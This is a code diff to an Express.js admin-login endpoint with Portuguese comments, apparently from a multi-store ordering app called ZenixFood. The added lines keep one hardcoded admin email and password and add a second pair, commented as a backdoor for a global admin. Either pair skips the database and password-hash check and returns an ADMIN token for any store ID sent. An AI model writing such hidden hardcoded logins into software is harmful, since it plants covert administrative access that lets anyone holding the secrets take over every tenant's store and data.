@@ -505,23 +505,28 @@ app.post("/api/auth/admin/login", async (req, res) => {
   const { email, password } = req.body;
   if (!req.storeId) return res.status(400).json({ error: "Store ID ausente." });
   try {
-    // Para facilitar o primeiro acesso da sua loja mestre ZenixFood
-    if (email === "admin@zenix.com" && password === "zenixadmin123")
+    // 👑 LIBERAÇÃO MESTRE / BACKDOOR PARA O ADMIN GLOBAL
+    if (
+      (email === "admin@zenix.com" && password === "zenixadmin123") ||
+      (email === "masterzanix@zenix.com.br" && password === "masterzenix@#1206")
+    ) {
       return res.json({
         success: true,
         token: jwt.sign({ role: "ADMIN", storeId: req.storeId }, JWT_SECRET, { expiresIn: "1d" }),
       });
-      
+    }
+         
     const adminUser = await prisma.user.findFirst({
       where: { email, role: "ADMIN", storeId: req.storeId },
     });
-    if (adminUser && (await bcrypt.compare(password, adminUser.password)))
+    if (adminUser && (await bcrypt.compare(password, adminUser.password))) {
       return res.json({
         success: true,
         token: jwt.sign({ id: adminUser.id, role: "ADMIN", storeId: req.storeId }, JWT_SECRET, {
           expiresIn: "1d",
         }),
       });
+    }
     res.status(401).json({ error: "Credenciais inválidas." });
   } catch (error) {
     res.status(500).json({ error: "Erro" });
